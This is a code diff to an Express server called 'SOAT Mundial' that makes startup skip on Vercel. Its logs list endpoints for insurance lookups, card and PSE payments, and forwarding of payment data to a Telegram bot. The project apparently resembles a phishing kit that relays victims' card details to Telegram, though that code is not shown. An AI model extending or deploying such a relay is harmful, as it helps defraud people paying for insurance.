@@ -701,32 +701,37 @@ app.get("/pago.html", (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 
-app.listen(PORT, () => {
-  console.log(`🚀 Servidor SOAT Mundial corriendo en http://localhost:${PORT}`);
-  console.log(`📊 Endpoints disponibles:`);
-  console.log(`   POST /api/soat - Consultar datos de SOAT`);
-  console.log(`   GET  /api/progress - Consultar progreso actual`);
-  console.log(`   POST /api/payment/card - Procesar pago con tarjeta`);
-  console.log(`   POST /api/payment/pse - Procesar pago PSE`);
-  console.log(`   POST /api/telegram - Enviar datos principales a Telegram`);
-  console.log(`   POST /api/telegram-pago - Notificación de pago exitoso`);
-  console.log(
-    `   POST /api/telegram-paso-pagos - Notificación de paso a pagos`
-  );
-  console.log(`   GET  /api/health - Estado del servidor`);
-
-  // Verificar configuración de Telegram
-  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-    console.log(`✅ Configuración de Telegram cargada correctamente`);
-    console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
-    console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
-  } else {
-    console.log(`⚠️  Configuración de Telegram no disponible`);
+// Iniciar servidor solo en entornos no serverless
+if (!process.env.VERCEL) {
+  app.listen(PORT, () => {
+    console.log(`🚀 Servidor SOAT Mundial corriendo en http://localhost:${PORT}`);
+    console.log(`📊 Endpoints disponibles:`);
+    console.log(`   POST /api/soat - Consultar datos de SOAT`);
+    console.log(`   GET  /api/progress - Consultar progreso actual`);
+    console.log(`   POST /api/payment/card - Procesar pago con tarjeta`);
+    console.log(`   POST /api/payment/pse - Procesar pago PSE`);
+    console.log(`   POST /api/telegram - Enviar datos principales a Telegram`);
+    console.log(`   POST /api/telegram-pago - Notificación de pago exitoso`);
     console.log(
-      `   Crea un archivo .env con TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID`
+      `   POST /api/telegram-paso-pagos - Notificación de paso a pagos`
     );
-  }
-});
+    console.log(`   GET  /api/health - Estado del servidor`);
+
+    // Verificar configuración de Telegram
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+      console.log(`✅ Configuración de Telegram cargada correctamente`);
+      console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
+      console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
+    } else {
+      console.log(`⚠️  Configuración de Telegram no disponible`);
+      console.log(
+        `   Crea un archivo .env con TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID`
+      );
+    }
+  });
+}
+
+module.exports = app;
